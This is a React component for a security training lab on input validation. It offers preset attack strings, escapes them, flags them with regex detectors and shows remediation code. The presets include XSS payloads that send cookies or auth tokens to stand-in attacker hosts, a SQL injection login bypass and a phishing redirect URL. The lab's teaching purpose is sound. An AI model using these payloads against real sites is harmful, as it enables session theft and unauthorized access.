import React, { useState } from 'react';
import { useSecurity } from '../context/SecurityContext';
import { 
  Code2, 
  ShieldAlert, 
  ShieldCheck, 
  Terminal, 
  CheckCircle2, 
  AlertTriangle, 
  FileCode,
  Copy,
  Check,
  RefreshCw
} from 'lucide-react';

interface PayloadPreset {
  id: string;
  name: string;
  category: 'XSS' | 'SQLi' | 'Open Redirect' | 'Safe';
  rawInput: string;
  description: string;
  cwe: string;
  threatLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'SAFE';
}

const PRESETS: PayloadPreset[] = [
  {
    id: 'p-1',
    name: 'Reflected XSS (Session Stealer in URL Parameter)',
    category: 'XSS',
    rawInput: `<script>fetch('https://evil-harvest.xyz/steal?c='+document.cookie)</script>`,
    description: 'Attackers embed this in phishing links. If reflected unescaped, it executes in the user session, exfiltrating authentication cookies.',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    threatLevel: 'CRITICAL'
  },
  {
    id: 'p-2',
    name: 'SQL Injection (Authentication Bypass via Tautology)',
    category: 'SQLi',
    rawInput: `admin' OR '1'='1' --`,
    description: 'Submitted in username fields of login portals to force SQL WHERE clauses to evaluate to TRUE without password validation.',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
    threatLevel: 'CRITICAL'
  },
  {
    id: 'p-3',
    name: 'Open Redirection Phishing Decoy',
    category: 'Open Redirect',
    rawInput: `https://evil-phish-portal.ru/harvest?victim=corporate`,
    description: 'Appended to legitimate login links (e.g. ?redirect_url=...) so victims trust the email link but get routed to the phishing site.',
    cwe: 'CWE-601: URL Redirection to Untrusted Site',
    threatLevel: 'HIGH'
  },
  {
    id: 'p-4',
    name: 'Polyglot SVG / Event Handler XSS',
    category: 'XSS',
    rawInput: `<img src="x" onerror="window.location='http://attacker.com?token='+localStorage.getItem('auth_token')">`,
    description: 'Uses an image tag with an invalid source to execute JavaScript when the onerror event fires.',
    cwe: 'CWE-79: Cross-Site Scripting (DOM/Reflected)',
    threatLevel: 'CRITICAL'
  },
  {
    id: 'p-5',
    name: 'Sanitized Clean Corporate Username',
    category: 'Safe',
    rawInput: `john.doe@company.org`,
    description: 'Standard RFC-compliant corporate email address with no active script syntax or SQL control characters.',
    cwe: 'N/A: Verified Safe Input',
    threatLevel: 'SAFE'
  }
];

export const InputValidationLab: React.FC = () => {
  const { addLog, completeTask } = useSecurity();
  const [currentInput, setCurrentInput] = useState(PRESETS[0].rawInput);
  const [selectedCategory, setSelectedCategory] = useState<string>(PRESETS[0].id);
  const [copiedCode, setCopiedCode] = useState(false);

  // Security sanitization and analysis engine
  const sanitizeHtml = (str: string) => {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  };

  const hasXSS = /<script|onerror|onload|javascript:|eval\(|<img|<iframe/i.test(currentInput);
  const hasSQLi = /'|\b(OR|AND)\b|--|\bUNION\b|\bSELECT\b|;/i.test(currentInput);
  const isOpenRedirect = /^https?:\/\//i.test(currentInput) && !currentInput.includes('company.com') && !currentInput.includes('company.org');

  const threatSeverity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'SAFE' = 
    hasXSS || hasSQLi ? 'CRITICAL' : isOpenRedirect ? 'HIGH' : 'SAFE';

  const sanitizedOutput = sanitizeHtml(currentInput);

  // Trigger analysis and logging
  const handleRunSecurityCheck = () => {
    completeTask('task-2');

    if (hasXSS) {
      addLog({
        eventType: 'INPUT_XSS_DETECTED',
        severity: 'CRITICAL',
        sourceIp: '198.51.100.88',
        details: 'Cross-Site Scripting (XSS) payload neutralized by input sanitization engine.',
        actionTaken: 'HTML_ENTITY_ENCODING_APPLIED',
        rawPayload: currentInput
      });
    } else if (hasSQLi) {
      addLog({
        eventType: 'INPUT_SQLI_DETECTED',
        severity: 'CRITICAL',
        sourceIp: '198.51.100.88',
        details: 'SQL Injection control metacharacters detected in input string.',
        actionTaken: 'PARAMETERIZED_BINDING_ENFORCED',
        rawPayload: currentInput
      });
    } else if (isOpenRedirect) {
      addLog({
        eventType: 'INPUT_OPEN_REDIRECT_BLOCKED',
        severity: 'WARNING',
        sourceIp: '198.51.100.88',
        details: 'Unvalidated external redirect URL detected. Blocked by domain whitelist policy.',
        actionTaken: 'REDIRECT_CONSTRAINED_TO_ORIGIN',
        rawPayload: currentInput
      });
    } else {
      addLog({
        eventType: 'INPUT_VALIDATION_PASSED',
        severity: 'INFO',
        sourceIp: '10.0.1.25',
        details: 'Input passed whitelist regex validation. No malicious metacharacters identified.',
        actionTaken: 'INPUT_PROCESSED'
      });
    }
  };

  const handleSelectPreset = (preset: PayloadPreset) => {
    setSelectedCategory(preset.id);
    setCurrentInput(preset.rawInput);
  };

  return (
    <div className="space-y-10">
      {/* Header */}
      <div>
        <div className="flex items-center gap-2 text-xs font-mono text-emerald-400 uppercase tracking-wider mb-2">
          <span>Module 02</span>
          <span aria-hidden="true">·</span>
          <span>Input Validation</span>
          <span aria-hidden="true">·</span>
          <span>Attack Vector Defense</span>
        </div>
        <h1 className="text-2xl font-bold tracking-tight text-white">
          Input Validation, Escaping & Attack Vector Sanitization
        </h1>
        <p className="mt-2 text-sm text-slate-400 max-w-3xl">
          Phishing actors weaponize input vectors—such as reflected parameters in login forms, search bars, and redirection queries—to hijack sessions and bypass controls. Test real-world payloads against defensive encoding and parameterized filters.
        </p>
      </div>

      {/* Preset Selector */}
      <section className="space-y-3">
        <div className="text-xs font-semibold text-slate-300">Select an Attack Vector Preset to Analyze:</div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
          {PRESETS.map((preset) => (
            <button
              key={preset.id}
              onClick={() => handleSelectPreset(preset)}
              className={`text-left rounded-xl border p-3.5 transition ${
                selectedCategory === preset.id
                  ? 'border-emerald-500/60 bg-emerald-950/20 ring-1 ring-emerald-500/30'
                  : 'border-slate-800 bg-slate-900/60 hover:bg-slate-900 hover:border-slate-700'
              }`}
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-white truncate">{preset.name}</span>
                <span
                  className={`text-[10px] font-mono px-1.5 py-0.5 rounded ${
                    preset.threatLevel === 'CRITICAL'
                      ? 'bg-rose-500/10 text-rose-400 border border-rose-500/30'
                      : preset.threatLevel === 'HIGH'
                      ? 'bg-amber-500/10 text-amber-400 border border-amber-500/30'
                      : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                  }`}
                >
                  {preset.threatLevel}
                </span>
              </div>
              <p className="mt-1 text-[11px] text-slate-400 line-clamp-2 leading-relaxed">
                {preset.description}
              </p>
            </button>
          ))}
        </div>
      </section>

      {/* Live Sandbox Workspace */}
      <section className="rounded-2xl border border-slate-800 bg-slate-900/40 p-6 sm:p-8 space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-4">
          <div>
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <Code2 className="h-4 w-4 text-emerald-400" />
              <span>Real-Time Sanitization & Defense Pipeline</span>
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">
              Observe how raw untrusted strings are tokenized, evaluated, and escaped before reaching application logic or DOM.
            </p>
          </div>
          <button
            onClick={handleRunSecurityCheck}
            className="flex items-center gap-2 rounded-lg bg-emerald-600 px-3.5 py-2 text-xs font-semibold text-white hover:bg-emerald-500 transition shadow-sm self-start sm:self-auto"
          >
            <ShieldCheck className="h-4 w-4" />
            <span>Execute Defensive Scan & Log</span>
          </button>
        </div>

        {/* Input & Output Split */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Raw Input Box */}
          <div className="space-y-2">
            <div className="flex items-center justify-between text-xs">
              <label className="font-semibold text-slate-300">Untrusted Raw Input Stream</label>
              <span className="font-mono text-[11px] text-slate-500">Length: {currentInput.length} chars</span>
            </div>
            <textarea
              rows={4}
              value={currentInput}
              onChange={(e) => setCurrentInput(e.target.value)}
              className="w-full rounded-xl border border-slate-700 bg-slate-950 p-3.5 text-xs text-rose-300 font-mono focus:border-emerald-500 focus:outline-none focus:ring-1 focus:ring-emerald-500 leading-relaxed"
              placeholder="Type or paste payload here..."
            />
            <div className="text-[11px] text-slate-500">
              Simulates untrusted query parameters (e.g. <code className="text-slate-400">?q=</code>, <code className="text-slate-400">?redirect=</code>, or POST body fields).
            </div>
          </div>

          {/* Sanitized Escaped Output Box */}
          <div className="space-y-2">
            <div className="flex items-center justify-between text-xs">
              <label className="font-semibold text-slate-300">Sanitized & Context-Encoded Safe Output</label>
              <span className="font-mono text-[11px] text-emerald-400 font-semibold">HTML Entity Escaped</span>
            </div>
            <div className="w-full h-[98px] overflow-y-auto rounded-xl border border-slate-800 bg-slate-950 p-3.5 text-xs text-emerald-300 font-mono leading-relaxed select-all">
              {sanitizedOutput || '<empty>'}
            </div>
            <div className="text-[11px] text-slate-500">
              Browser parses escaped characters strictly as passive text, preventing execution of JavaScript or SQL tokens.
            </div>
          </div>
        </div>

        {/* Threat Diagnosis Card */}
        <div className="rounded-xl border border-slate-800 bg-slate-950/80 p-5 space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              {threatSeverity === 'CRITICAL' || threatSeverity === 'HIGH' ? (
                <ShieldAlert className="h-5 w-5 text-rose-400" />
              ) : (
                <CheckCircle2 className="h-5 w-5 text-emerald-400" />
              )}
              <span className="text-sm font-semibold text-white">Threat Vector Diagnosis</span>
            </div>
            <span
              className={`text-xs font-mono font-bold px-2 py-0.5 rounded ${
                threatSeverity === 'CRITICAL'
                  ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                  : threatSeverity === 'HIGH'
                  ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                  : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
              }`}
            >
              STATUS: {threatSeverity}
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 pt-2 text-xs border-t border-slate-800/80">
            <div>
              <span className="text-slate-500 block">XSS Vector Present:</span>
              <span className={`font-mono font-bold ${hasXSS ? 'text-rose-400' : 'text-slate-400'}`}>
                {hasXSS ? 'YES (Malicious Script/Event Detected)' : 'None Detected'}
              </span>
            </div>
            <div>
              <span className="text-slate-500 block">SQLi Metacharacters:</span>
              <span className={`font-mono font-bold ${hasSQLi ? 'text-rose-400' : 'text-slate-400'}`}>
                {hasSQLi ? 'YES (SQL Quote / Comment Syntax)' : 'None Detected'}
              </span>
            </div>
            <div>
              <span className="text-slate-500 block">Open Redirect Risk:</span>
              <span className={`font-mono font-bold ${isOpenRedirect ? 'text-amber-400' : 'text-slate-400'}`}>
                {isOpenRedirect ? 'YES (Untrusted External URL)' : 'Compliant'}
              </span>
            </div>
          </div>
        </div>

        {/* Remediation Code Patterns */}
        <div className="space-y-3 pt-2">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-semibold text-white flex items-center gap-1.5">
              <Terminal className="h-3.5 w-3.5 text-cyan-400" />
              <span>Production Remediation Implementation (Defense in Depth)</span>
            </h3>
            <button
              onClick={() => {
                navigator.clipboard.writeText(`// Production Defense Snippet:
// 1. Parameterized SQL Queries (Prevents SQLi):
const user = await db.query('SELECT * FROM users WHERE email = $1', [cleanEmail]);

// 2. Strict Input Whitelisting (Express Validator):
body('username').trim().isAlphanumeric().isLength({ min: 3, max: 32 });

// 3. Open Redirect Domain Enforcement:
const allowedDomains = ['company.com', 'portal.company.com'];
const target = new URL(redirectUrl, 'https://company.com');
if (!allowedDomains.includes(target.hostname)) {
  throw new Error('Forbidden external redirect target');
}`);
                setCopiedCode(true);
                setTimeout(() => setCopiedCode(false), 2000);
              }}
              className="flex items-center gap-1 text-[11px] text-cyan-400 hover:text-cyan-300 font-mono"
            >
              {copiedCode ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
              <span>{copiedCode ? 'Copied' : 'Copy Code'}</span>
            </button>
          </div>

          <div className="rounded-xl border border-slate-800 bg-slate-950 p-4 font-mono text-[11px] text-slate-300 space-y-2 overflow-x-auto">
            <div className="text-slate-500">// 1. Parameterized SQL Queries (Neutralizes SQL Injection 100%):</div>
            <div className="text-cyan-300">const user = await db.query('SELECT * FROM accounts WHERE email = $1', [untrustedEmail]);</div>
            
            <div className="text-slate-500 pt-2">// 2. Context-Aware HTML Escaping (Neutralizes Reflected XSS):</div>
            <div className="text-emerald-300">const cleanString = DOMPurify.sanitize(untrustedInput, &#123; ALLOWED_TAGS: [] &#125;);</div>

            <div className="text-slate-500 pt-2">// 3. Strict Origin Whitelist (Neutralizes Open Redirection in Phishing Links):</div>
            <div className="text-amber-300">
              const target = new URL(untrustedRedirect, 'https://company.com');<br />
              if (!['company.com', 'sso.company.com'].includes(target.hostname)) &#123;<br />
              &nbsp;&nbsp;return res.redirect('/dashboard'); // Fallback to safe internal origin<br />
              &#125;
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};
